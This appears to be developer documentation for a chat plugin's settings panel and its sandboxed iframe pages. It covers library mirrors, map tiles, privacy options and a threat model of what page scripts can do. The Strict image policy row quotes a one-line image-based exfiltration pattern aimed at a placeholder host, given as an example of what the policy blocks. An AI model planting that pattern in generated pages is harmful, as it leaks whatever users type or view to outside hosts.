# IUI Settings & soft fence path (`0.13`)

Plugin-only path (no MCP, no dsh core fork, **no Gateway / packs / `:3101` / vLLM**).  
Default: **dsh → FreeLLMAPI (`:3001`) → model**; IUI plugin does systemPrompt / pre-step / steer / stream hints, then mounts ```iui-html sandbox.

Chinese remodel plan: `docs/REDESIGN-SANDBOX-FIRST.zh-CN.md`.

## Settings → IUI

Groups (top to bottom): **外观 Appearance · 生成 Generation · 网络与资源 Network · 隐私与安全 Privacy · 模板 Templates · 开发者 Developer** (collapsed).
Appearance and templates apply immediately (saved in this browser and, when the host form is writable, to the config). Everything else is staged and written by **Save**; it applies to new messages. Hosts without the settings-form primitives show an "upgrade dsh" card instead of a broken form.

| Group | Control | Field | Default | Meaning |
|-------|---------|-------|---------|---------|
| Appearance | Accent / density / text size / corners / colour scheme | `pageStyleJson` | auto | Default look of every ```iui-html page (same controls as ⋯ → 外观). Pushed live to open pages and previewed in two real sandbox pages (light + dark). Scheme `auto` follows the **host** theme (dsh light/dark), not the OS |
| Generation | Page generation | `uiEagerness` | `balanced` | `restrained`: pages only when asked. `balanced`: explain / compare questions answered in prose with a 「做成可交互页面」 pill. `eager`: visualise whenever it helps |
| Generation | Auto repair | `fenceFeedback` | on | Same-turn repair when a page fails to render or is cut off. Each repair is one extra model call |
| Generation | Format correction | `formatReferee` | on | Only when the user explicitly asks for a page and the reply has none → steer toward ```iui-html. Off also stops the short per-page-type hints. Each correction is one extra model call. The group shows how many repairs / corrections ran since the server started |
| Network | Connectivity (read-only, shown first) | — | — | 「连通性」 card: the plugin HEAD-probes jsDelivr, npmmirror, unpkg, Zstatic, staticfile, Wikipedia, Wikimedia images, the Esri tile host, AMap (高德) tiles and Poly Haven model downloads (2 s each, concurrently, cached 1 h; published as `networkProbe` in `runtime-config.json`, fresh run via `network-probe.json?refresh=1` / 重新检测; the browser keeps the last result ≤ 24 h). Below the hosts it says what auto mode picked: library mirror order, basemap, trip-photo source |
| Network (高级：手动指定, collapsed) | Library source | `cdnPreset` | `auto` | Every library (Leaflet, Chart.js, ECharts, d3, three, **gsap**, mermaid, ag-grid) ships inside the plugin and loads from its asset route first — no internet needed. Bare ES imports (`import gsap from 'gsap'`, `'gsap/ScrollTrigger'`, `'d3'`, `'chart.js'`, `'chart.js/auto'`, `'chart.js/helpers'`, `'three'`) map to the same local files (d3 / Chart.js through generated ESM wrappers, so no esm.sh). `auto`: plugin route → reachable mirrors fastest-first from the probe (npmmirror / Zstatic / staticfile / jsDelivr / unpkg; without a probe npmmirror → jsDelivr). `local`: plugin route → jsDelivr → npmmirror. `china`: plugin route → npmmirror → jsDelivr. `global`: jsDelivr → unpkg → plugin route. `custom`: the template below first. Every mirror serves the identical npm file, so one SRI hash covers all of them. Each source times out after 8 s; when all fail, the page strip offers 切换国内源/海外源并重试 |
| Network (高级) | Custom library URL | `cdnTemplate` | — | Only for `custom`: `https://…/{name}@{version}/{file}` (https, must contain `{name}` and `{file}`; validated inline, invalid values block Save) |
| Network (高级) | Map basemap | `mapTiles` | `auto` | `auto`: AMap (高德) tiles when the probe looks like mainland China (Wikipedia + Wikimedia unreachable, or Esri down / ≥ 4× slower than AMap), otherwise Esri / OpenStreetMap. `amap`: always AMap (outside mainland China maps fall back to the next provider). `global`: never AMap. AMap tiles are GCJ-02; pages keep writing WGS-84 coordinates and IUI switches Leaflet to a GCJ-02 CRS so markers, routes and fitBounds line up. **AMap terms:** the public tile endpoint is fine for personal use; commercial deployments need an AMap licence — choose `global` there |
| Network | Trip photos | — | — | When Wikipedia + Wikimedia are both unreachable, trip / place cards skip the Commons lookup and show a place-name map card (a few basemap tiles around the stop + pin + name; AMap in mainland China) instead of waiting on blocked photos |
| Privacy | Strict image policy | `strictImagePolicy` | off | Sandbox `img-src` / `font-src` drop the `https:` wildcard: only `data:` / `blob:`, Wikimedia, map tiles and the plugin's own library route. Blocks `new Image().src = "https://x/?d=" + data` exfiltration; arbitrary web images stop loading. Planned default **on** in 0.14 |
| Privacy | Page storage / feedback stats | — | — | Clear per-conversation page state; export (after an explicit consent tick) or clear the local 👍/👎 statistics |
| Templates | 我的模板 | `userTemplatesJson` | — | Pages saved with ⋯ → 「保存为模板」. Also listed in the template drawer under 「我的模板」 (试用 / 复制 / 删除). Import / export JSON here. Format: `[{"id","name","description?","source"}]`, `source` = the ```iui-html fence body; ≤ 30 templates, ≤ 64 KB each. Legacy `{demo}` catalog entries are skipped with a notice |
| Developer | Custom CSS tokens | `customTokensJson` | — | `{"--color-text-info":"#0f766e"}`. Checked against the sandbox token catalogue: unknown names are applied but flagged, unsafe values (`;{}<>`, `url()`, comments) are dropped |
| Developer | Legacy fences (deprecated) | `legacyFences` | off | Render old ```` ```iui ```` / ```` ```dsh-ui ```` fences. Removed in 0.14 |
| Developer | Raw templates JSON | `userTemplatesJson` | — | Same list as 「模板」, editable as text (applied on Save) |
| Developer | Jev router (experimental) | `jevEnabled`, `jevApiKey`, `jevBaseUrl`, `jevModel` | off | TypeSafe System One format pick; off without key. **Privacy:** when on, each user message's text is sent to the third-party TypeSafe service (warning shown) |
| Developer | Structured Outputs + probe | `structuredOutputsMode`, `structuredOutputsProbeUrl`, `structuredOutputsProbeKey` | `auto` | Builds / advertises a json_schema. The current dsh host cannot attach `response_format`, so this does not affect generation (stated in the UI) |
| (hidden) | Theme | `themeId` | `iui-default` | Single built-in theme; legacy pack ids resolve here. Not shown |

`src/config/settings-fields.ts` is the single list of bound fields; a test keeps it equal to the `Config` schema keys (minus hidden `themeId`).

Debug: start dsh with `IUI_DEBUG=1` to write the IUI system-prompt section to `$TMPDIR/iui-system-section.txt` (never written otherwise).

Runtime config is refreshed when the tab becomes visible / focused, after every Save, and every 60 s while visible (no fixed 2.5 s poll).

**Removed in 0.13 (do not expect these controls):** component pack picker, theme picker, per-group token overrides (`--dsl-g-*`, had no effect on ```iui-html pages), Gateway transport/sidecar, instance-store persist, frames.sse mount, DIL schema endpoints.

Save applies to **new** fences (hard refresh if the client mirror looks stale).

Endpoints (no secrets):  
`…/assets/response-format.json`, `…/assets/format-router.json`, `…/assets/runtime-config.json`.

## FreeLLMAPI env (optional soft fence)

Host / FreeLLMAPI may expose `IUI_FENCE_*` style hints; they do **not** become sampling constraints. Prefer plugin Settings toggles above.


## Sandbox threat model (what page scripts can see)

Pages are written by the model and run in an iframe with `sandbox="allow-scripts"` only — no `allow-same-origin`, `allow-modals`, `allow-popups`, `allow-forms` or top navigation. The frame has an opaque origin.

A page script **can**:
- read its own html/css/js and anything the user types into it;
- receive host bindings / appData of the **current session**, and only if its source uses them (`data-iui-bind`, `$bind`, `iui-bindings` / `iui-appdata` events, `appData` / `bindings`);
- load images over any `https:` URL (unless **Strict image policy** is on) — this is a data-exfiltration channel for whatever the page can read;
- navigate its own frame to another URL (CSP cannot prevent frame self-navigation).

A page script **cannot**:
- read the host DOM, cookies, localStorage, other chats or other frames;
- read another session's bindings (`bindings.json` / `bindings.sse` require `?session=`, reject cross-site requests and have no "latest session" fallback);
- `fetch` arbitrary hosts (CSP `connect-src` is limited to library CDNs and map/geocode services);
- open system dialogs (`alert` / `confirm` / `prompt` become an in-page toast; `confirm` returns `false`, `prompt` returns `null`);
- send a model turn or fill the composer without a real user click, and then at most 1 per frame per 2 s and 6 per tab per minute;
- open a popup (links go through the host, https/mailto only).

A page that stops responding for 5 s (e.g. `while(true){}`) gets a「页面无响应」overlay with **Stop** (replaces the document, ending its scripts) and **Reload**. Whether the host stays responsive during such a loop depends on the browser putting the opaque sandbox frame in its own process (Chromium site isolation for sandboxed frames); on browsers that do not, the loop can still freeze the tab until Stop takes effect.

Map embeds (`map` node `embed`) are limited to exact provider hosts (OpenStreetMap `export/embed.html`, Google `maps/embed`, Bing `maps/embed`, maps.google.com, uri.amap.com, map.baidu.com); other URLs are shown as a plain link. ```json / no-language code blocks are never auto-rendered: a block that is strictly a page object gets a「▶ 渲染为页面」button instead.

## Sandbox bridge security note

Sandbox iframes are opaque (`sandbox="allow-scripts"` without `allow-same-origin`), so `postMessage` uses `targetOrigin: "*"` with frameId + `event.source === contentWindow` checks. Do not treat `*` alone as sufficient without those checks.
